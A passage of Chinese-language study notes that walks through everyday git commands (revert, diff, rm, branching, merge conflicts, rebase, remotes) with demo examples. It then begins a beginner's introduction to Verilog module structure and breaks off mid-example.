<p><code>-n</code>参数表示不进行提交,也就是不生成新的提交,而是直接在当前分支上进行撤销,等待你手动进行提交</p>
<p>如果想要撤销一系列提交,可以使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-cs-git-__codelineno-23-1"></a>git<span class="w"> </span>revert<span class="w"> </span>-n<span class="w"> </span>&lt;start_commit&gt;^..&lt;end_commit&gt;
</span></code></pre></div>
<p>例如,我们的提交链是这样的</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-cs-git-__codelineno-24-1"></a>A-&gt;B-&gt;C-&gt;D
</span></code></pre></div>
<p>如果我们想要撤销B和C,可以使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-cs-git-__codelineno-25-1"></a>git<span class="w"> </span>revert<span class="w"> </span>-n<span class="w"> </span>B^..C
</span></code></pre></div>
<h3 id="note-cs-git-git-diff">git diff<a class="headerlink" href="#note-cs-git-git-diff" title="Permanent link">&para;</a></h3>
<p><code>git diff</code>命令可以用来查看工作区,暂存区,和提交之间的差异,也可以用来比较两个分支之间的差异,以及不同版本文件之间的差异</p>
<h4 id="note-cs-git-vs">工作区vs暂存区<a class="headerlink" href="#note-cs-git-vs" title="Permanent link">&para;</a></h4>
<p>默认不加任何参数,<code>git diff</code>会显示工作区与暂存区之间的差异</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-cs-git-__codelineno-26-1"></a>git<span class="w"> </span>diff
</span></code></pre></div>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/diff1.png" width="400" />

<figcaption>删除文件</figcaption>
</figure>
<p>可以发现,工作区中删除了text.txt文件,而暂存区中没有发生变化</p>
<div align="center">
<img src="../NOTE/CS/GIT/img/diff2.png" width="400">
<img src="../NOTE/CS/GIT/img/diff3.png" width="400">
</div>

<p>这时git diff会显示工作区与暂存区之间的差异，删除了text.txt文件，什么都没有增加</p>
<h4 id="note-cs-git-vs_1">工作区vs提交<a class="headerlink" href="#note-cs-git-vs_1" title="Permanent link">&para;</a></h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-cs-git-__codelineno-27-1"></a>git diff &lt;commit_hash&gt;
</span></code></pre></div>
<p>这条命令会显示当前工作区与指定提交之间的差异</p>
<p>例如,我们运行</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#note-cs-git-__codelineno-28-1"></a>git<span class="w"> </span>diff<span class="w"> </span>HEAD
</span></code></pre></div>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/diff4.png" width="400" />

<figcaption>工作区与提交</figcaption>
</figure>
<p>可以看到,工作区中添加了text.txt文件,而提交中没有发生变化</p>
<h4 id="note-cs-git-vs_2">暂存区vs提交<a class="headerlink" href="#note-cs-git-vs_2" title="Permanent link">&para;</a></h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#note-cs-git-__codelineno-29-1"></a>git diff --cached &lt;commit_hash&gt;
</span></code></pre></div>
<p>这条命令会显示暂存区与指定提交之间的差异</p>
<p>例如,我们运行</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#note-cs-git-__codelineno-30-1"></a>git<span class="w"> </span>diff<span class="w"> </span>--cached<span class="w"> </span>HEAD
</span></code></pre></div>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/diff5.png" width="400" />

<figcaption>未add</figcaption>
</figure>
<p>这时候没有任何差异,因为我们没有把工作区的修改添加到暂存区</p>
<p>我们进行一次add</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#note-cs-git-__codelineno-31-1"></a>git<span class="w"> </span>add<span class="w"> </span>text.txt
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#note-cs-git-__codelineno-31-2"></a>git<span class="w"> </span>diff<span class="w"> </span>--cached<span class="w"> </span>HEAD
</span></code></pre></div>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/diff6.png" width="400" />

<figcaption>已add</figcaption>
</figure>
<p>可以看到,暂存区与提交之间发生了差异,也就是我们添加的text.txt文件</p>
<p>此时运行<code>git ls-files</code>可以看到暂存区中的文件,只包含text2.txt文件</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/diff7.png" width="400" />

<figcaption>暂存区中的文件</figcaption>
</figure>
<h4 id="note-cs-git-vs_3">提交vs提交<a class="headerlink" href="#note-cs-git-vs_3" title="Permanent link">&para;</a></h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#note-cs-git-__codelineno-32-1"></a>git diff &lt;commit_hash1&gt; &lt;commit_hash2&gt;
</span></code></pre></div>
<p>这条命令会显示两个提交之间的差异</p>
<p>例如,我们删除text.txt文件,并进行一次提交后，运行</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#note-cs-git-__codelineno-33-1"></a>git<span class="w"> </span>diff<span class="w"> </span>HEAD<span class="w"> </span>HEAD^
</span></code></pre></div>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/diff8.png" width="400" />

<figcaption>提交与提交</figcaption>
</figure>
<p>可以看到,第二次提交与第一次提交之间发生了差异,也就是我们删除的text.txt文件</p>
<p>如果想要查看特定文件在不同提交之间的差异,可以使用</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><code>git diff 版本1 版本2</code>,指的是与版本1相比,版本2的变动；<code>HEAD</code>代表当前分支的最新版本，<code>HEAD^</code>代表当前分支的上一版本</p>
</div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#note-cs-git-__codelineno-34-1"></a>git<span class="w"> </span>diff<span class="w"> </span>&lt;commit_hash1&gt;<span class="w"> </span>&lt;commit_hash2&gt;<span class="w">  </span>&lt;file_path&gt;
</span></code></pre></div>
<p>例如,我们想要查看text.txt文件在第一次提交和第二次提交之间的差异,可以使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#note-cs-git-__codelineno-35-1"></a>git<span class="w"> </span>diff<span class="w"> </span>HEAD<span class="w"> </span>HEAD^<span class="w"> </span>text.txt
</span></code></pre></div>
<h4 id="note-cs-git-vs_4">分支vs分支<a class="headerlink" href="#note-cs-git-vs_4" title="Permanent link">&para;</a></h4>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#note-cs-git-__codelineno-36-1"></a>git<span class="w"> </span>diff<span class="w"> </span>&lt;branch1&gt;<span class="w"> </span>&lt;branch2&gt;
</span></code></pre></div>
<p>这条命令会显示两个分支之间的差异</p>
<h3 id="note-cs-git-_8">删除文件<a class="headerlink" href="#note-cs-git-_8" title="Permanent link">&para;</a></h3>
<p>删除文件有以下几种方式</p>
<ol>
<li><code>rm+add</code>:首先使用<code>rm</code>命令删除文件,然后使用<code>add</code>命令将删除的文件添加到暂存区</li>
</ol>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#note-cs-git-__codelineno-37-1"></a>rm<span class="w"> </span>text.txt
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#note-cs-git-__codelineno-37-2"></a>git<span class="w"> </span>add<span class="w"> </span>text.txt
</span></code></pre></div>
<ol>
<li><code>git rm</code>:直接使用<code>git rm</code>命令删除文件,这个命令会同时将删除的文件添加到暂存区</li>
</ol>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#note-cs-git-__codelineno-38-1"></a>git<span class="w"> </span>rm<span class="w"> </span>text.txt
</span></code></pre></div>
<p>相当于是<code>rm+add</code>的快捷命令</p>
<ol>
<li><code>git rm --cached</code>:这个命令会删除文件,但是不从工作区中删除,而是从暂存区中删除</li>
</ol>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#note-cs-git-__codelineno-39-1"></a>git<span class="w"> </span>rm<span class="w"> </span>--cached<span class="w"> </span>text.txt
</span></code></pre></div>
当不想提交某个文件时这条命令是好用的</p>
<p>我们首先在仓库里多创建几个文件,然后测试三条指令</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/rm1.png" width="400" />

<figcaption>rm+add</figcaption>
</figure>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/rm2.png" width="400" />

<figcaption>git rm</figcaption>
</figure>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/rm3.png" width="400" />

<figcaption>git rm --cached</figcaption>
</figure>
<p>最后我们commit一次,将三个文件从版本库中删除</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/rm4.png" width="400" />

<figcaption>commit</figcaption>
</figure>
<p>可以看到删除了三个文件,但是工作区中的text4文件仍然存在(可以使用<code>git diff</code>查看版本差异进一步确认删除的文件)</p>
<h3 id="note-cs-git-_9">分支<a class="headerlink" href="#note-cs-git-_9" title="Permanent link">&para;</a></h3>
<p>分支是Git中一个非常重要的概念，它允许你在同一个仓库中同时进行多个开发工作。分支的存在使得你可以在不影响主线代码的情况下进行开发、测试和实验。</p>
<p>分支的存在使得多人的协同开发变得容易,可以同时进行多个开发工作,而保持主线的稳定工作;</p>
<p>每个分支都有自己的提交历史,分支之间可以相互合并,也可以相互独立;</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/branch1.png" width="400" />

<figcaption>分支示意图</figcaption>
</figure>
<p>创建一个分支，可以使用以下命令</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#note-cs-git-__codelineno-40-1"></a>git<span class="w"> </span>branch<span class="w"> </span>&lt;branch_name&gt;
</span></code></pre></div>
<p>例如,创建一个名为<code>dev</code>的分支</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#note-cs-git-__codelineno-41-1"></a>git<span class="w"> </span>branch<span class="w"> </span>dev
</span></code></pre></div>
<p>创建之后，可以使用<code>git branch</code>查看所有分支</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#note-cs-git-__codelineno-42-1"></a>git<span class="w"> </span>branch
</span></code></pre></div>
<div align="center">
<img src="../NOTE/CS/GIT/img/branch2.png" width="200">
</div>
<p>这里可以看到master和dev两个分支,前面的<code>*</code>表示当前所在的分支,也就是master分支</p>
<p>现在，假设我们要在dev分支上进行一系列开发工作,首先需要切换到dev分支</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#note-cs-git-__codelineno-43-1"></a>git<span class="w"> </span>checkout<span class="w"> </span>dev
</span></code></pre></div>
<div class="admonition warning">
<p class="admonition-title">git switch</p>
<p>使用<code>git checkout</code>命令的时候，可能会存在一些潜在的问题:除了切换分支之外,<code>git checkout</code>还可以用来恢复文件或者目录到之前的某一个状态,比如我们意外修改了某一个文件,可以使用<code>git checkout -- &lt;file_path&gt;</code>来恢复文件(如果暂存区中有,则恢复到暂存区中的文件,否则恢复到上一次提交的文件);而这个时候如果分支名和文件名相同,就会出现歧义,<code>git checkout</code>会默认切换分支而不是恢复文件,为了避免这种情况,可以使用<code>git switch</code>命令来切换分支;</p>
</div>
<p>切换之后，可以使用<code>git branch</code>查看当前所在的分支;</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/branch3.png" width="200" />

<figcaption>切换分支</figcaption>
</figure>
<p>现在,我们在dev分支上进行一系列开发工作,添加一系列文件；</p>
<p>在这一过程中，我们的主线上也进行的提交</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/branch4.png" width="300" />

<figcaption>过程</figcaption>
</figure>
<p>现在假设dev上的开发以已经完成了,我们想要将dev分支合并到master分支上,可以使用以下命令</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#note-cs-git-__codelineno-44-1"></a>git<span class="w"> </span>merge<span class="w"> </span>dev
</span></code></pre></div>
<p>意为将dev分支合并到 <strong>当前所在分支</strong> (master分支)上,合并之后,如果没有冲突,会自动进行一次commit;</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/branch5.png" width="300" />

<figcaption>git log </figcaption>
</figure>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>使用<code>git log --oneline --graph</code>可以查看分支合并的过程</p>
<p>实际上,<code>git log</code>有很多参数可以使用</p>
<ul>
<li><code>--oneline</code>: 只显示一行提交信息</li>
<li><code>--graph</code>: 显示分支合并的过程</li>
<li><code>--all</code>: 显示所有分支的提交历史</li>
<li><code>--reverse</code>: 逆序显示提交历史</li>
<li><code>--since=&lt;date&gt;</code>: 显示从某个日期开始的提交历史</li>
<li><code>--until=&lt;date&gt;</code>: 显示到某个日期为止的提交历史</li>
<li><code>--author=&lt;pattern&gt;</code>: 显示某个作者的提交历史</li>
<li><code>--grep=&lt;pattern&gt;</code>: 显示包含某个关键字的提交历史</li>
</ul>
<p>并且可以组合使用,例如<code>git log --oneline --graph --all</code></p>
</div>
<p>merge结束后的分支仍然存在,如果想要删除某个分支,可以使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#note-cs-git-__codelineno-45-1"></a>git<span class="w"> </span>branch<span class="w"> </span>-d<span class="w"> </span>&lt;branch_name&gt;
</span></code></pre></div>
<p>注意<code>-d</code>只能删除已经进行过合并的分支,如果想要强制删除某个分支,可以使用</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#note-cs-git-__codelineno-46-1"></a>git<span class="w"> </span>branch<span class="w"> </span>-D<span class="w"> </span>&lt;branch_name&gt;
</span></code></pre></div>
<p>即使用大写的<code>D</code></p>
<h4 id="note-cs-git-_10">分支合并冲突<a class="headerlink" href="#note-cs-git-_10" title="Permanent link">&para;</a></h4>
<p>假设不同的开发者同时对同一个文件的同一个地方进行修改,那么合并的时候就会发生冲突,Git会提示你发生了冲突,你需要手动解决冲突</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/branch6.png" width="400" />

<figcaption>冲突制造过程</figcaption>
</figure>
<p>在这一过程中,我首先在分支feat上对main.txt文件进行了修改,然后进行了一次commit,然后切换到master分支,对main.txt文件相同位置进行了修改,然后进行了一次commit;</p>
<p>现在我们试图将feat分支合并到master分支上,会发生冲突;</p>
<p>此时查看main.txt文件,可以看到发生了冲突;</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#note-cs-git-__codelineno-47-1"></a>&gt; cat main.txt
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#note-cs-git-__codelineno-47-2"></a>main
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#note-cs-git-__codelineno-47-3"></a>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#note-cs-git-__codelineno-47-4"></a>main line 2 updated after feat
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#note-cs-git-__codelineno-47-5"></a>=======
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#note-cs-git-__codelineno-47-6"></a>aha~ now is feat!
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#note-cs-git-__codelineno-47-7"></a>&gt;&gt;&gt;&gt;&gt;&gt;&gt; feat
</span></code></pre></div>
<div align="center">
<img src="../NOTE/CS/GIT/img/branch8.png" width="400">
</div>

<p>运行<code>git diff</code>或者直接查看发生冲突的文件都可以看到冲突;</p>
<p>解决冲突，保留我们想要的内容，然后进行一次commit，解决冲突；</p>
<p>最后我们来看看合并后的的git log</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/branch9.png" width="300" />

<figcaption>git log</figcaption>
</figure>
<p>可以看到,master分支的提交历史中包含了feat分支的提交历史;成功合并了feat分支;</p>
<h3 id="note-cs-git-rebase">Rebase<a class="headerlink" href="#note-cs-git-rebase" title="Permanent link">&para;</a></h3>
<p>除了使用merge命令进行分支合并,还可以使用rebase命令进行分支合并;</p>
<p>与merge不同,rebase执行完毕后,会将两次分支的提交历史合并成一条线,而不是像溪流一样汇聚在一起；</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/rebase1.png" width="400" />

<figcaption>示意图</figcaption>
</figure>
<p>rebase的工作原理是，找到两个分支的共同祖先，然后从共同祖先开始，将当前分支的提交应用到目标分支上；</p>
<p>为了演示两种不同的合并方式,我创建了两个分支,然后进行了一系列的commit;并把这个仓库复制一遍；</p>
<p>现在有两个分支,分别是main和rbs,共同祖先为<code>merge conflict</code>这一次提交,两个分支各自进行了一次提交,为<code>main 1</code>和<code>rbs 1</code>;</p>
<p>现在，假设我们要把main分支rebase到rbs分支上</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#note-cs-git-__codelineno-48-1"></a>git<span class="w"> </span>switch<span class="w"> </span>main
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#note-cs-git-__codelineno-48-2"></a>git<span class="w"> </span>rebase<span class="w"> </span>rbs
</span></code></pre></div>
这条命令会将<code>merge conflict</code>后，main分支上的提交接在rbs分支上</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/rebase2.png" width="300" />

<figcaption>rebase</figcaption>
</figure>
<p>然后再试试看rebase rbs到main上</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#note-cs-git-__codelineno-49-1"></a>git<span class="w"> </span>switch<span class="w"> </span>rbs
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#note-cs-git-__codelineno-49-2"></a>git<span class="w"> </span>rebase<span class="w"> </span>main
</span></code></pre></div>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/rebase3.png" width="300" />

<figcaption>rebase</figcaption>
</figure>
<p>可以看到两次的提交记录是不同的;</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>rebase的中文是"变基",这一含义十分清楚,再某个分支上运行<code>git rebase &lt;branch_name&gt;</code>命令,就是将当前分支的提交历史变基到目标分支上,即从两个分支的共同祖先开始,将当前分支的提交接在目标分支上;</p>
</div>
<h2 id="note-cs-git-_11">关联远程仓库<a class="headerlink" href="#note-cs-git-_11" title="Permanent link">&para;</a></h2>
<p>Git的强大之处在于它能够与远程仓库进行交互,远程仓库可以是一个服务器,也可以是一个云平台,例如GitHub,GitLab,Gitee等,开发者们在自己的电脑上进行开发,然后将代码推送到远程仓库,其他人可以在远程仓库上进行协作;</p>
<p>这里主要介绍如何与GitHub进行交互;</p>
<figure>
<img alt="Image title" src="../NOTE/CS/GIT/img/remote.png" width="400" />

<figcaption>示意图</figcaption>
</figure>
<p>首先注册一个Github账号,然后创建一个仓库;例如创建一个名为<code>test</code>的仓库;</p>
<p>然后使用<code>git remote add &lt;remote_name&gt; &lt;remote_url&gt;</code>命令将本地仓库与远程仓库关联;</p>
<p>或者使用<code>git clone &lt;remote_url&gt;</code>命令将远程仓库克隆到本地;</p>
<p>然后在本地进行一系列操作,例如添加文件,进行commit,然后使用<code>git push &lt;remote_name&gt; &lt;branch_name&gt;</code>命令将本地仓库推送到远程仓库;</p>
<p>这一步实际上是在合并本地仓库和远程仓库;</p>
<p>如果是多人协作,在你push之前,可能别人已经修改过远程仓库,这时候你需要先pull一下,然后再push;</p>
<p>如果pull的时候发生冲突,你需要解决冲突,然后再push;</p>
<p>要想删除远程仓库,可以使用<code>git remote remove &lt;remote_name&gt;</code></p></section></section>
                    <section class='print-page md-section' id='section-2-4-4' heading-number='2.4.4'>
                        <h1>编程语言<a class='headerlink' href='#section-2-4-4' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-cs-verilog-verilog" heading-number="2.4.4.1"><h1 id="note-cs-verilog-verilog-verilog-">Verilog 学习笔记-入门篇<a class="headerlink" href="#note-cs-verilog-verilog-verilog-" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1011 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 207 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 8 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 6 分钟</p>
</div>
<blockquote>
<p>老师不教是吧,自己学</p>
</blockquote>
<h2 id="note-cs-verilog-verilog-verilog">Verilog模块结构<a class="headerlink" href="#note-cs-verilog-verilog-verilog" title="Permanent link">&para;</a></h2>
<p>Verilog模块大致如下</p>
<p><div class="language-verilog highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-verilog-verilog-__codelineno-0-1"></a><span class="k">module</span><span class="w"> </span><span class="n">name_of_module</span><span class="p">([</span><span class="err">端口列表</span><span class="p">]);</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-verilog-verilog-__codelineno-0-2"></a><span class="w">     </span><span class="err">端口信号声明</span><span class="p">;</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-verilog-verilog-__codelineno-0-3"></a><span class="w">     </span><span class="err">参数声明</span><span class="p">;</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-verilog-verilog-__codelineno-0-4"></a><span class="w">     </span><span class="o">---</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-cs-verilog-verilog-__codelineno-0-5"></a><span class="w">     </span><span class="err">内部信号说明</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-cs-verilog-verilog-__codelineno-0-6"></a><span class="w">     </span><span class="k">assign</span><span class="w"> </span><span class="err">语句</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-cs-verilog-verilog-__codelineno-0-7"></a><span class="w">     </span><span class="err">底层模块或者门原调用</span><span class="p">(</span><span class="err">包括生成模块</span><span class="p">)</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-cs-verilog-verilog-__codelineno-0-8"></a><span class="w">     </span><span class="n">Initial</span><span class="w"> </span><span class="err">或</span><span class="w"> </span><span class="k">always</span><span class="w"> </span><span class="err">语句块</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-cs-verilog-verilog-__codelineno-0-9"></a><span class="w">     </span><span class="err">任务和函数定义</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-cs-verilog-verilog-__codelineno-0-10"></a><span class="w">     </span><span class="k">specify</span><span class="w"> </span><span class="err">块</span><span class="p">(</span><span class="err">路径延迟</span><span class="p">)</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-cs-verilog-verilog-__codelineno-0-11"></a><span class="k">endmodule</span>
</span></code></pre></div>
<strong>详细说明</strong></p>
<ul>
<li>常用语句只有三种<ul>
<li><code>assign</code>语句</li>
<li><code>always</code>语句</li>
<li>底层模块调用语句</li>
</ul>
</li>
<li><strong>三种语句的顺序无关</strong> ,这与C语言很不同</li>
<li>
<p>除一开始的<code>module</code>和<code>endmodule</code>必须写之外,其他都是可选的</p>
</li>
<li>
<p>缩进在Verilog中并不重要,它主要使用<code>begin</code>和<code>end</code>来分割</p>
</li>
<li>
<p>模块名是指电路的名字,由用户指定,最好与文件名一致</p>
</li>
<li>
<p><strong>端口列表</strong> 是指电路的输入/输出信号名称列表,信号名由用户指定,各名称用逗号隔开;</p>
</li>
<li>
<p><strong>端口信号声明</strong> 是要说明端口信号的输入输出属性、信号的数据类型,以及信号的位宽;输入输出属性有input,output,inout三种,信号的数据类型常用的有wire和reg两种;信号的位宽用[n1:n2]表示;同一类信号之间用逗号隔开;</p>
</li>
<li><strong>信号位宽不做说明的话默认是1位,信号类型不做说明的话,默认是wire类型的</strong></li>
<li><strong>参数声明</strong> 要说明参数的名称和初值(例如<code>parameter</code> reg A = 1'b1)</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>二选一多路选择器的Verilog描述
 <div class="language-Verilog highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-verilog-verilog-__codelineno-1-1"></a><span class="k">module</span><span class="w"> </span><span class="n">MUX21a</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">y</span><span class="p">);</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-verilog-verilog-__codelineno-1-2"></a><span class="k">input</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">s</span><span class="p">;</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-verilog-verilog-__codelineno-1-3"></a><span class="k">output</span><span class="w"> </span><span class="n">y</span><span class="p">;</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-cs-verilog-verilog-__codelineno-1-4"></a><span class="k">assign</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="p">(</span><span class="n">s</span><span class="o">?</span><span class="nl">a:</span><span class="n">b</span><span class="p">);</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-cs-verilog-verilog-__codelineno-1-5"></a><span class="k">endmodule</span>
</span></code></pre></div>
 边沿D触发器的Verilog描述
 <div class="language-verilog highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-verilog-verilog-__codelineno-2-1"></a><span class="k">module</span><span class="w"> </span><span class="n">DFFL</span><span class="p">(</span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">,</span><span class="n">Q</span><span class="p">);</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-verilog-verilog-__codelineno-2-2"></a><span class="k">input</span><span class="w"> </span><span class="n">CLK</span><span class="p">,</span><span class="n">D</span><span class="p">;</span>
